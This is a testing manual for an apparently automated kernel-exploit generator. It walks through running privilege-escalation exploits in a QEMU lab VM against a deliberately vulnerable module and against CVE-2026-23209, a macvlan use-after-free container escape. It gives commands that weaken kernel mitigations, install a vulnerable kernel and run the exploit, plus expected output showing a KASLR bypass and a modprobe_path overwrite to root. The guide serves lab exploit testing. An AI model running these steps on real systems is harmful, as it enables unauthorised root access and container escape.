# Manual Testing Inside the Guest VM

## Prerequisites (on the host, before SSH)

Make sure you've generated the exploit:

```bash
git clone https://github.com/anthropics/angband.git
cd angband
python3 -m venv venv
source venv/bin/activate
pip install -e .
```

```bash
source venv/bin/activate
angband init demo --target ubuntu-24.04-x86_64
angband generate
```

## SSH into the Guest

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    -i mordor_run/ssh/id_ed25519 -p 2222 ubuntu@localhost
```

## Inside the Guest

### 1. Verify the 9p mount

Cloud-init should have done this already:

```bash
mountpoint /mnt/angband
# If not mounted:
sudo mkdir -p /mnt/angband
sudo mount -t 9p -o trans=virtio,version=9p2000.L host0 /mnt/angband
```

### 2. Install build deps (first boot only)

```bash
sudo apt-get update -y && sudo apt-get install -y build-essential linux-headers-$(uname -r)
```

### 3. Build and load the vuln_drill kernel module

```bash
cd /mnt/angband/module/vuln_drill
make
sudo insmod ./vuln_drill.ko
```

Verify with `dmesg | tail` — you should see `vuln_drill: loaded -- start hacking`.

### 4. Disable kptr_restrict

```bash
echo 0 | sudo tee /proc/sys/kernel/kptr_restrict > /dev/null
```

### 5. Run the exploit

```bash
cd /mnt/angband/mordor_run/current
chmod +x exploit
./exploit 2>&1 | tee /mnt/angband/mordor_run/current/exploit_run.log
```

If you're in an interactive TTY, a successful run drops you into a root shell. If piped (like above with `tee`), it prints `"Non-interactive mode -- exiting with root"`.

### 6. Collect verification logs

```bash
sudo dmesg | grep 'vuln_drill:' > /mnt/angband/mordor_run/current/dmesg_tail.log
cat /proc/vuln_drill > /mnt/angband/mordor_run/current/vuln_drill_status.log
```

### 7. Verify success

```bash
# Exploit completed?
grep -q "EXPLOIT COMPLETE" /mnt/angband/mordor_run/current/exploit_run.log && echo "PASS" || echo "FAIL"

# All 7 stages hit in order?
cat /proc/vuln_drill | grep sequence_complete   # should be "yes"
cat /proc/vuln_drill | grep out_of_order        # should be "no"
```

## What a successful run looks like

The exploit walks through 7 stages (prep → groom → trigger → leak → primitive → escalate → cleanup). Key indicators of success:

- `PRIVILEGE ESCALATION SUCCESSFUL` in the exploit output
- `sequence_complete: yes` and `out_of_order: no` in `/proc/vuln_drill`
- All 7 `vuln_drill: stage <name> received` lines present in `dmesg`

The 9p mount means all logs written under `/mnt/angband/mordor_run/current/` are immediately visible on your host at `mordor_run/current/` — no file copying needed.

---

## Testing Container Escape (CVE-2026-23209)

### Prerequisites

CVE-2026-23209 exploits a macvlan UAF for **container escape** (uid=0 in container → host root). It requires:
- Vulnerable kernel: **6.8.0-101-generic** (available in Ubuntu 24.04 HWE kernel)
- The binary must run as uid=0 (in a privileged container or directly as root)
- `iproute2` must be installed in the guest

### 1. Install Vulnerable Kernel (6.8.0-101)

```bash
# Check current kernel
uname -r
# Should show: 6.8.0-101-generic

# If running a newer kernel, install 6.8.0-101
sudo apt-get update
sudo apt-get install -y linux-image-6.8.0-101-generic linux-headers-6.8.0-101-generic
# Reboot into 6.8.0-101 via GRUB menu
```

### 2. Install iproute2 (for `ip` command)

```bash
sudo apt-get install -y iproute2
```

### 3. Generate the Exploit

On the **host** (outside QEMU):

```bash
cd angband
source venv/bin/activate
angband init CVE-2026-23209 --target ubuntu-24.04-x86_64
angband generate
```

### 4. Copy Binary to Guest

The QEMU harness mounts the host's `angband` directory at `/mnt/angband` inside the guest via 9p. After generation:

```bash
cp mordor_run/current/cve_2026_23209 /mnt/angband/a.out
```

### 5. Run as Root in Guest

```bash
cd /mnt/angband
chmod +x a.out
sudo ./a.out 2>&1 | tee container_escape.log
```

**Expected output**:
```
[*] Resolving kernel symbols via kallsyms...
[+] KASLR bypass: kernel symbols resolved
[+] commit_creds        @ 0xffffffff9ab47230
[+] prepare_kernel_cred @ 0xffffffff9ab47870
[+] modprobe_path       @ 0xffffffff9d1de400
[*] Cloning into new user+network namespace...
[+] userns: uid=0 euid=0 (CAP_NET_ADMIN available)
[*] ===== Stage: prep =====
[*] ===== Stage: groom =====
[*] ===== Stage: trigger =====
[*] CVE-2026-23209 macvlan UAF
[*] ===== Stage: leak =====
[*] ===== Stage: primitive =====
[*] ===== Stage: escalate =====
[*] modprobe_path overwrite
[+] ROOT ACHIEVED via modprobe_path!
[+] PRIVILEGE ESCALATION SUCCESSFUL
[+] uid=0 euid=0 gid=0 egid=0
```

### 6. Verify on Vulnerable Kernel

```bash
# Check kernel version
uname -r  # Must be 6.8.0-101-generic

# Check if exploit succeeded
grep "ROOT ACHIEVED" container_escape.log
grep "uid=0 euid=0" container_escape.log
```

### Testing in Docker Container

Docker container testing has issues with nested namespace operations. **Recommended: Test directly on the VM instead** (see section 5 above).

If you must test in Docker:

```bash
# On the guest (with iproute2 installed)
sudo docker rm -f angband-test 2>/dev/null

# Run a privileged container (NOTE: nested namespaces may hang)
sudo docker run --privileged \
  -v /home/ubuntu:/angband \
  -d --name angband-test ubuntu:latest sleep infinity

# Wait for container to start
sleep 2

# Copy exploit binary into container
sudo docker cp /home/ubuntu/a.out angband-test:/tmp/a.out

# Execute exploit inside container (may hang at namespace clone)
sudo docker exec angband-test timeout 90 /tmp/a.out
```

**Known issues with Docker testing**:
- Nested `clone(CLONE_NEWUSER|CLONE_NEWNET)` may hang even with `--privileged`
- The `ip` command may not exist in `ubuntu:latest` - install `iproute2` first
- Use `docker cp` to transfer binary since 9p mounts may not refresh

**Reliable test**: Run directly on the VM as root (section 5 above).

### Kernel Mitigation Checklist

Before testing, disable these mitigations in the guest:

```bash
sudo sysctl -w kernel.perf_event_paranoid=-1
sudo sysctl -w kernel.kptr_restrict=0
```

### Verification Matrix

| Scenario | Command | Expected Result |
|----------|---------|-----------------|
| Root on VM | `sudo ./a.out` | ✅ `ROOT ACHIEVED via modprobe_path` |
| Privileged container | `docker exec angband-test /tmp/a.out` | ⚠️ May hang at namespace clone |
| Unprivileged user | `./a.out` (uid=1000) | ❌ Fails - requires uid=0 |
| Newer kernel (6.8.0-106) | `sudo ./a.out` | ❌ Fails - kernel patched |

### Key Differences from Demo (vuln_drill)

| Aspect | Demo (vuln_drill) | CVE-2026-23209 |
|--------|-------------------|-----------------|
| Target | uid=1000 → uid=0 | uid=0 in container → host root |
| Method | Direct kernel module | macvlan UAF + modprobe_path |
| Requirements | None (uses /proc/vuln_drill) | CAP_SYS_ADMIN for namespaces |
| Works unprivileged | Yes | No |
